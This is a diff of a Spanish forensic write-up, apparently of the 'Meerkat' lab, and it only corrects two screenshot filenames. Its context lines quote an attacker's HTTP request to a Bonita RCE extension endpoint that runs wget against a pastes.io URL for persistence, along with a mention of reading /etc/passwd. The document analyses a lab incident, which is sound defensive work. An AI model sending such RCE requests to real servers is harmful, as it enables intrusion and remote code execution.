@@ -232,7 +232,7 @@ La respuesta a `cat /etc/passwd` confirmó que el servidor es una instancia **Ub
 Una tercera sesión independiente (`JSESSIONID=745EE4F7243DA99264F07781FBB9B4E3`) ejecutó el exploit nuevamente (extensión `page/132`) con un objetivo diferente: establecer persistencia.
 
 *GET request al endpoint /extension/rce con cmd=wget*
-![GET request al endpoint /extension/rce con cmd=wget](./screenshots-meerkat/03-GET-request-rce-con-wget-PNG)
+![GET request al endpoint /extension/rce con cmd=wget](./screenshots-meerkat/03-GET-request-rce-con-wget.PNG)
 
 ```http
 GET /bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8
@@ -273,7 +273,7 @@ tshark -r meerkat.pcap `
 # → 57 líneas únicas en hex
 ```
 *Output de tshark mostrando las líneas hex de los intentos — extracto de las primeras 10*
-![Output de tshark mostrando las líneas hex de los intentos — extracto de las primeras 10](04-Output-tshark-10-primeras-líneas-hex-intentos)
+![Output de tshark mostrando las líneas hex de los intentos — extracto de las primeras 10](04-Output-tshark-10-primeras-líneas-hex-intentos.PNG)
 
 
 La decodificación de los 57 valores únicos revela:
